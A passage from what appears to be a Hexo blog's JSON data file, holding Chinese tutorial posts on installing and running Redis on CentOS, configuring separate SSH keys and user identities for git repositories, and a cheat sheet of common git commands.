iptables restart\n```\n\n至此你就可以用客户端redis-cli连接了：`redis-cli -h 127.0.0.1 -p 6380`\n\n<!-- more -->\n\n## 二、redis主从配置\n\n\n## 三、redis sentinel配置\n\n\n\n\n\n## 四、参考文档：\n[Redis安装及主从配置](!http://www.cnblogs.com/liuling/p/2014-4-19-02.html)\n[centos 安装redis（一台机器可以安装多个redis）](!http://www.cnblogs.com/eric-z/p/4153101.html)\n[在一台机器上搭建多个redis实例](!http://my.oschina.net/liuke1556/blog/287594)\n","slug":"article/cache/redis单机多实例部署","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxpu000y5nbtc5p7esr3","content":"<p>[TOC]</p>\n<h2 id=\"一、redis安装\"><a href=\"#一、redis安装\" class=\"headerlink\" title=\"一、redis安装\"></a>一、redis安装</h2><h2 id=\"Redis介绍\"><a href=\"#Redis介绍\" class=\"headerlink\" title=\"Redis介绍\"></a>Redis介绍</h2><p>Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。</p>\n<h3 id=\"1-下载redis\"><a href=\"#1-下载redis\" class=\"headerlink\" title=\"1. 下载redis\"></a>1. 下载redis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /opt/work/local</div><div class=\"line\"></div><div class=\"line\">wget -c http://download.redis.io/releases/redis-3.0.3.tar.gz</div><div class=\"line\">tar -zxvf redis-3.0.3.tar.gz</div></pre></td></tr></table></figure>\n<p>解压后的文件目录如下：<br><img src=\"http://images.cnitblog.com/i/420264/201404/191557148074939.jpg\" alt=\"解压后的Redis目录结构\"></p>\n<h3 id=\"2-编译redis\"><a href=\"#2-编译redis\" class=\"headerlink\" title=\"2. 编译redis\"></a>2. 编译redis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /opt/work/local/redis-3.0.3</div><div class=\"line\">make</div></pre></td></tr></table></figure>\n<h3 id=\"3-拷贝产生的可执行命令\"><a href=\"#3-拷贝产生的可执行命令\" class=\"headerlink\" title=\"3. 拷贝产生的可执行命令\"></a>3. 拷贝产生的可执行命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir -p /opt/work/local/redis/bin</div><div class=\"line\">cd /opt/work/local/redis-3.0.3/src</div><div class=\"line\">cp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin</div></pre></td></tr></table></figure>\n<h3 id=\"4-redis服务启动\"><a href=\"#4-redis服务启动\" class=\"headerlink\" title=\"4. redis服务启动\"></a>4. redis服务启动</h3><p>(1) 修改环境变量(vim  ~/.bash_profile)如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">REDIS_HOME=/opt/work/local/redis</div><div class=\"line\"></div><div class=\"line\">PATH=$PATH:$HOME/bin:$REDIS_HOME/bin</div></pre></td></tr></table></figure></p>\n<p>(2) 修改完成后，记得使用<code>source ~/.bash_profile</code>生效。</p>\n<p>(3) 查看redis-server使用文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">[@zw_25_105 local]# redis-server --help</div><div class=\"line\">Usage: ./redis-server [/path/to/redis.conf] [options]</div><div class=\"line\">       ./redis-server - (read config from stdin)</div><div class=\"line\">       ./redis-server -v or --version</div><div class=\"line\">       ./redis-server -h or --help</div><div class=\"line\">       ./redis-server --test-memory &lt;megabytes&gt;</div><div class=\"line\"></div><div class=\"line\">Examples:</div><div class=\"line\">       ./redis-server (run the server with default conf)</div><div class=\"line\">       ./redis-server /etc/redis/6379.conf</div><div class=\"line\">       ./redis-server --port 7777</div><div class=\"line\">       ./redis-server --port 7777 --slaveof 127.0.0.1 8888</div><div class=\"line\">       ./redis-server /etc/myredis.conf --loglevel verbose</div><div class=\"line\"></div><div class=\"line\">Sentinel mode:</div><div class=\"line\">       ./redis-server /etc/sentinel.conf --sentinel</div></pre></td></tr></table></figure></p>\n<p>(4) 启动单机redis<br>使用默认的参数启动redis：<code>redis-server</code><br>指定端口启动redis：<code>redis-server --port 6380</code></p>\n<p>(5) 允许redis端口远程连接<br>修改防火墙配置文件，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/sysconfig/iptables</div><div class=\"line\"></div><div class=\"line\"># 添加一行</div><div class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT</div><div class=\"line\"></div><div class=\"line\"># 重新加载规则</div><div class=\"line\">service iptables restart</div></pre></td></tr></table></figure></p>\n<p>至此你就可以用客户端redis-cli连接了：<code>redis-cli -h 127.0.0.1 -p 6380</code></p>\n<a id=\"more\"></a>\n<h2 id=\"二、redis主从配置\"><a href=\"#二、redis主从配置\" class=\"headerlink\" title=\"二、redis主从配置\"></a>二、redis主从配置</h2><h2 id=\"三、redis-sentinel配置\"><a href=\"#三、redis-sentinel配置\" class=\"headerlink\" title=\"三、redis sentinel配置\"></a>三、redis sentinel配置</h2><h2 id=\"四、参考文档：\"><a href=\"#四、参考文档：\" class=\"headerlink\" title=\"四、参考文档：\"></a>四、参考文档：</h2><p><a href=\"!http://www.cnblogs.com/liuling/p/2014-4-19-02.html\">Redis安装及主从配置</a><br><a href=\"!http://www.cnblogs.com/eric-z/p/4153101.html\">centos 安装redis（一台机器可以安装多个redis）</a><br><a href=\"!http://my.oschina.net/liuke1556/blog/287594\">在一台机器上搭建多个redis实例</a></p>\n","excerpt":"<p>[TOC]</p>\n<h2 id=\"一、redis安装\"><a href=\"#一、redis安装\" class=\"headerlink\" title=\"一、redis安装\"></a>一、redis安装</h2><h2 id=\"Redis介绍\"><a href=\"#Redis介绍\" class=\"headerlink\" title=\"Redis介绍\"></a>Redis介绍</h2><p>Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。</p>\n<h3 id=\"1-下载redis\"><a href=\"#1-下载redis\" class=\"headerlink\" title=\"1. 下载redis\"></a>1. 下载redis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /opt/work/local</div><div class=\"line\"></div><div class=\"line\">wget -c http://download.redis.io/releases/redis-3.0.3.tar.gz</div><div class=\"line\">tar -zxvf redis-3.0.3.tar.gz</div></pre></td></tr></table></figure>\n<p>解压后的文件目录如下：<br><img src=\"http://images.cnitblog.com/i/420264/201404/191557148074939.jpg\" alt=\"解压后的Redis目录结构\"></p>\n<h3 id=\"2-编译redis\"><a href=\"#2-编译redis\" class=\"headerlink\" title=\"2. 编译redis\"></a>2. 编译redis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /opt/work/local/redis-3.0.3</div><div class=\"line\">make</div></pre></td></tr></table></figure>\n<h3 id=\"3-拷贝产生的可执行命令\"><a href=\"#3-拷贝产生的可执行命令\" class=\"headerlink\" title=\"3. 拷贝产生的可执行命令\"></a>3. 拷贝产生的可执行命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir -p /opt/work/local/redis/bin</div><div class=\"line\">cd /opt/work/local/redis-3.0.3/src</div><div class=\"line\">cp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin</div></pre></td></tr></table></figure>\n<h3 id=\"4-redis服务启动\"><a href=\"#4-redis服务启动\" class=\"headerlink\" title=\"4. redis服务启动\"></a>4. redis服务启动</h3><p>(1) 修改环境变量(vim  ~/.bash_profile)如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">REDIS_HOME=/opt/work/local/redis</div><div class=\"line\"></div><div class=\"line\">PATH=$PATH:$HOME/bin:$REDIS_HOME/bin</div></pre></td></tr></table></figure></p>\n<p>(2) 修改完成后，记得使用<code>source ~/.bash_profile</code>生效。</p>\n<p>(3) 查看redis-server使用文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">[@zw_25_105 local]# redis-server --help</div><div class=\"line\">Usage: ./redis-server [/path/to/redis.conf] [options]</div><div class=\"line\">       ./redis-server - (read config from stdin)</div><div class=\"line\">       ./redis-server -v or --version</div><div class=\"line\">       ./redis-server -h or --help</div><div class=\"line\">       ./redis-server --test-memory &lt;megabytes&gt;</div><div class=\"line\"></div><div class=\"line\">Examples:</div><div class=\"line\">       ./redis-server (run the server with default conf)</div><div class=\"line\">       ./redis-server /etc/redis/6379.conf</div><div class=\"line\">       ./redis-server --port 7777</div><div class=\"line\">       ./redis-server --port 7777 --slaveof 127.0.0.1 8888</div><div class=\"line\">       ./redis-server /etc/myredis.conf --loglevel verbose</div><div class=\"line\"></div><div class=\"line\">Sentinel mode:</div><div class=\"line\">       ./redis-server /etc/sentinel.conf --sentinel</div></pre></td></tr></table></figure></p>\n<p>(4) 启动单机redis<br>使用默认的参数启动redis：<code>redis-server</code><br>指定端口启动redis：<code>redis-server --port 6380</code></p>\n<p>(5) 允许redis端口远程连接<br>修改防火墙配置文件，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/sysconfig/iptables</div><div class=\"line\"></div><div class=\"line\"># 添加一行</div><div class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT</div><div class=\"line\"></div><div class=\"line\"># 重新加载规则</div><div class=\"line\">service iptables restart</div></pre></td></tr></table></figure></p>\n<p>至此你就可以用客户端redis-cli连接了：<code>redis-cli -h 127.0.0.1 -p 6380</code></p>","more":"<h2 id=\"二、redis主从配置\"><a href=\"#二、redis主从配置\" class=\"headerlink\" title=\"二、redis主从配置\"></a>二、redis主从配置</h2><h2 id=\"三、redis-sentinel配置\"><a href=\"#三、redis-sentinel配置\" class=\"headerlink\" title=\"三、redis sentinel配置\"></a>三、redis sentinel配置</h2><h2 id=\"四、参考文档：\"><a href=\"#四、参考文档：\" class=\"headerlink\" title=\"四、参考文档：\"></a>四、参考文档：</h2><p><a href=\"!http://www.cnblogs.com/liuling/p/2014-4-19-02.html\">Redis安装及主从配置</a><br><a href=\"!http://www.cnblogs.com/eric-z/p/4153101.html\">centos 安装redis（一台机器可以安装多个redis）</a><br><a href=\"!http://my.oschina.net/liuke1556/blog/287594\">在一台机器上搭建多个redis实例</a></p>"},{"title":"git多仓库配置","date":"2016-02-18T04:32:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n\n## 一、密钥选择\n默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。\n\n例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：\n``` bash\nHost github.com\nHostName github.com\nUser git\nIdentityFile /Users/yeshaoting/.ssh/id_rsa_github\n```\n\n\n## 二、用户配置\n代码提交的用户信息。\n\n### 1. 全局配置\n``` bash\ngit config --global user.name \"叶绍亭\"\ngit config --global user.email \"yeshaoting@meituan.com\"\n```\n\n会在用户目录生成或修改~/.gitconfig文件。\n默认情况下，会使用此文件里的配置内容。\n\n\n### 2. 仓库配置\n``` bash\ngit config user.name \"yeshaoting\"\ngit config user.email \"yeshaoting@163.com\"\n```\n\n会修改当前仓库.git/config文件内容。\n此文件里的配置会覆盖全局配置里相同的配置内容。\n\n\n## 三、参考文档\n - [1.5 起步 - 初次运行 Git 前的配置](https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置)\n - [Git: Using Different User Emails for Different Repositories](https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/)\n - [Set git email address on a per repository basis](http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis)\n","source":"_posts/article/git/git多仓库配置.md","raw":"title: git多仓库配置\ntags:\n  - git\ncategories:\n  - 版本控制\ndate: 2016-02-18 12:32:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n\n## 一、密钥选择\n默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。\n\n例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：\n``` bash\nHost github.com\nHostName github.com\nUser git\nIdentityFile /Users/yeshaoting/.ssh/id_rsa_github\n```\n\n\n## 二、用户配置\n代码提交的用户信息。\n\n### 1. 全局配置\n``` bash\ngit config --global user.name \"叶绍亭\"\ngit config --global user.email \"yeshaoting@meituan.com\"\n```\n\n会在用户目录生成或修改~/.gitconfig文件。\n默认情况下，会使用此文件里的配置内容。\n\n\n### 2. 仓库配置\n``` bash\ngit config user.name \"yeshaoting\"\ngit config user.email \"yeshaoting@163.com\"\n```\n\n会修改当前仓库.git/config文件内容。\n此文件里的配置会覆盖全局配置里相同的配置内容。\n\n\n## 三、参考文档\n - [1.5 起步 - 初次运行 Git 前的配置](https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置)\n - [Git: Using Different User Emails for Different Repositories](https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/)\n - [Set git email address on a per repository basis](http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis)\n","slug":"article/git/git多仓库配置","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxpx000z5nbtptbemyhp","content":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、密钥选择\"><a href=\"#一、密钥选择\" class=\"headerlink\" title=\"一、密钥选择\"></a>一、密钥选择</h2><p>默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。</p>\n<p>例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">Host github.com</div><div class=\"line\">HostName github.com</div><div class=\"line\">User git</div><div class=\"line\">IdentityFile /Users/yeshaoting/.ssh/id_rsa_github</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、用户配置\"><a href=\"#二、用户配置\" class=\"headerlink\" title=\"二、用户配置\"></a>二、用户配置</h2><p>代码提交的用户信息。</p>\n<h3 id=\"1-全局配置\"><a href=\"#1-全局配置\" class=\"headerlink\" title=\"1. 全局配置\"></a>1. 全局配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config --global user.name <span class=\"string\">\"叶绍亭\"</span></div><div class=\"line\">git config --global user.email <span class=\"string\">\"yeshaoting@meituan.com\"</span></div></pre></td></tr></table></figure>\n<p>会在用户目录生成或修改~/.gitconfig文件。<br>默认情况下，会使用此文件里的配置内容。</p>\n<h3 id=\"2-仓库配置\"><a href=\"#2-仓库配置\" class=\"headerlink\" title=\"2. 仓库配置\"></a>2. 仓库配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config user.name <span class=\"string\">\"yeshaoting\"</span></div><div class=\"line\">git config user.email <span class=\"string\">\"yeshaoting@163.com\"</span></div></pre></td></tr></table></figure>\n<p>会修改当前仓库.git/config文件内容。<br>此文件里的配置会覆盖全局配置里相同的配置内容。</p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ul>\n<li><a href=\"https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置\" target=\"_blank\" rel=\"external\">1.5 起步 - 初次运行 Git 前的配置</a></li>\n<li><a href=\"https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/\" target=\"_blank\" rel=\"external\">Git: Using Different User Emails for Different Repositories</a></li>\n<li><a href=\"http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis\" target=\"_blank\" rel=\"external\">Set git email address on a per repository basis</a></li>\n</ul>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、密钥选择\"><a href=\"#一、密钥选择\" class=\"headerlink\" title=\"一、密钥选择\"></a>一、密钥选择</h2><p>默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。</p>\n<p>例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">Host github.com</div><div class=\"line\">HostName github.com</div><div class=\"line\">User git</div><div class=\"line\">IdentityFile /Users/yeshaoting/.ssh/id_rsa_github</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、用户配置\"><a href=\"#二、用户配置\" class=\"headerlink\" title=\"二、用户配置\"></a>二、用户配置</h2><p>代码提交的用户信息。</p>\n<h3 id=\"1-全局配置\"><a href=\"#1-全局配置\" class=\"headerlink\" title=\"1. 全局配置\"></a>1. 全局配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config --global user.name <span class=\"string\">\"叶绍亭\"</span></div><div class=\"line\">git config --global user.email <span class=\"string\">\"yeshaoting@meituan.com\"</span></div></pre></td></tr></table></figure>\n<p>会在用户目录生成或修改~/.gitconfig文件。<br>默认情况下，会使用此文件里的配置内容。</p>\n<h3 id=\"2-仓库配置\"><a href=\"#2-仓库配置\" class=\"headerlink\" title=\"2. 仓库配置\"></a>2. 仓库配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config user.name <span class=\"string\">\"yeshaoting\"</span></div><div class=\"line\">git config user.email <span class=\"string\">\"yeshaoting@163.com\"</span></div></pre></td></tr></table></figure>\n<p>会修改当前仓库.git/config文件内容。<br>此文件里的配置会覆盖全局配置里相同的配置内容。</p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ul>\n<li><a href=\"https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置\">1.5 起步 - 初次运行 Git 前的配置</a></li>\n<li><a href=\"https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/\">Git: Using Different User Emails for Different Repositories</a></li>\n<li><a href=\"http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis\">Set git email address on a per repository basis</a></li>\n</ul>\n"},{"title":"git命令小记","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 1. git日志格式化\n``` shell\ngit whatchanged -1 --pretty=raw --no-abbrev\ngit log -1 --pretty=format:'commit %H%ntree %T%nparent %P%nauthor %an <%ae> %at %ar%ncommitter %cn <%ce> %ct %cr%n%n %s%n%n'\n```\n\n\n## 2. 标签按时间排序\n``` shell\n子模块最新的tag: git submodule foreach 'git tag | xargs -I@ git log --format=format:\"%ci %H @%n\" -1 @ | sort -r | head -1'\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort -r\n```\n\n\n## 3. 重置本地代码\n`git reset --mixed`：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息\n`git reset --soft`：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可\n`git reset --hard`：彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n\n## 4. 创建分支\ngit branch develop\n\n\n## 5. 切换分支\ngit checkout develop\n\n<!-- more -->\n\n## 6. 查看分支版本\ngit branch\ngit branch -v\ngit branch -r\n\n\n## 7. 项目多模块更新\ngit submodule init\ngit submodule update\ngit submodule status\n\n\n## 8. 修改最近一次提交\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n\n## 9. git ssh配置\n密钥&公钥对生成(默认生成位置为：~/.ssh)：\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n\n**说明**：\nid_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。\nid_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。\n\n测试命令：\n> git -T User@Host\n\n### git配置优先顺序\nlocal > global > system\nlocal：项目目录/.git/config\nglobal：当前用户目录/.gitconfig\nsystem：/etc/gitconfig\n\n\n## 10.配置值获取\nconfig demo：\n[user]\n        name = shaotingye\n        email = shaotingye@sohu-inc.com\n\n获取命令为：\n> git config --get user.email\n\n\n## 11. git 放弃本地修改 强制更新\n``` shell\ngit fetch --all\ngit reset --hard origin/master\n```\n\n参考：http://blog.csdn.net/a06062125/article/details/11727273","source":"_posts/article/git/git命令小记.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\n  - 小记\n  - 命令\ntitle: git命令小记\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 1. git日志格式化\n``` shell\ngit whatchanged -1 --pretty=raw --no-abbrev\ngit log -1 --pretty=format:'commit %H%ntree %T%nparent %P%nauthor %an <%ae> %at %ar%ncommitter %cn <%ce> %ct %cr%n%n %s%n%n'\n```\n\n\n## 2. 标签按时间排序\n``` shell\n子模块最新的tag: git submodule foreach 'git tag | xargs -I@ git log --format=format:\"%ci %H @%n\" -1 @ | sort -r | head -1'\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort -r\n```\n\n\n## 3. 重置本地代码\n`git reset --mixed`：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息\n`git reset --soft`：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可\n`git reset --hard`：彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n\n## 4. 创建分支\ngit branch develop\n\n\n## 5. 切换分支\ngit checkout develop\n\n<!-- more -->\n\n## 6. 查看分支版本\ngit branch\ngit branch -v\ngit branch -r\n\n\n## 7. 项目多模块更新\ngit submodule init\ngit submodule update\ngit submodule status\n\n\n## 8. 修改最近一次提交\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n\n## 9. git ssh配置\n密钥&公钥对生成(默认生成位置为：~/.ssh)：\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n\n**说明**：\nid_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。\nid_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。\n\n测试命令：\n> git -T User@Host\n\n### git配置优先顺序\nlocal > global > system\nlocal：项目目录/.git/config\nglobal：当前用户目录/.gitconfig\nsystem：/etc/gitconfig\n\n\n## 10.配置值获取\nconfig demo：\n[user]\n        name = shaotingye\n        email = shaotingye@sohu-inc.com\n\n获取命令为：\n> git config --get user.email\n\n\n## 11. git 放弃本地修改 强制更新\n``` shell\ngit fetch --all\ngit reset --hard origin/master\n```\n\n参考：http://blog.csdn.net/a06062125/article/details/11727273","slug":"article/git/git命令小记","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxq000125nbt5p8ylxre","content":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"1-git日志格式化\"><a href=\"#1-git日志格式化\" class=\"headerlink\" title=\"1. git日志格式化\"></a>1. git日志格式化</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git whatchanged -1 --pretty=raw --no-abbrev</div><div class=\"line\">git log -1 --pretty=format:&apos;commit %H%ntree %T%nparent %P%nauthor %an &lt;%ae&gt; %at %ar%ncommitter %cn &lt;%ce&gt; %ct %cr%n%n %s%n%n&apos;</div></pre></td></tr></table></figure>\n<h2 id=\"2-标签按时间排序\"><a href=\"#2-标签按时间排序\" class=\"headerlink\" title=\"2. 标签按时间排序\"></a>2. 标签按时间排序</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">子模块最新的tag: git submodule foreach &apos;git tag | xargs -I@ git log --format=format:&quot;%ci %H @%n&quot; -1 @ | sort -r | head -1&apos;</div><div class=\"line\">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort</div><div class=\"line\">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort -r</div></pre></td></tr></table></figure>\n<h2 id=\"3-重置本地代码\"><a href=\"#3-重置本地代码\" class=\"headerlink\" title=\"3. 重置本地代码\"></a>3. 重置本地代码</h2><p><code>git reset --mixed</code>：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息<br><code>git reset --soft</code>：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可<br><code>git reset --hard</code>：彻底回退到某个版本，本地的源码也会变为上一个版本的内容</p>\n<h2 id=\"4-创建分支\"><a href=\"#4-创建分支\" class=\"headerlink\" title=\"4. 创建分支\"></a>4. 创建分支</h2><p>git branch develop</p>\n<h2 id=\"5-切换分支\"><a href=\"#5-切换分支\" class=\"headerlink\" title=\"5. 切换分支\"></a>5. 切换分支</h2><p>git checkout develop</p>\n<a id=\"more\"></a>\n<h2 id=\"6-查看分支版本\"><a href=\"#6-查看分支版本\" class=\"headerlink\" title=\"6. 查看分支版本\"></a>6. 查看分支版本</h2><p>git branch<br>git branch -v<br>git branch -r</p>\n<h2 id=\"7-项目多模块更新\"><a href=\"#7-项目多模块更新\" class=\"headerlink\" title=\"7. 项目多模块更新\"></a>7. 项目多模块更新</h2><p>git submodule init<br>git submodule update<br>git submodule status</p>\n<h2 id=\"8-修改最近一次提交\"><a href=\"#8-修改最近一次提交\" 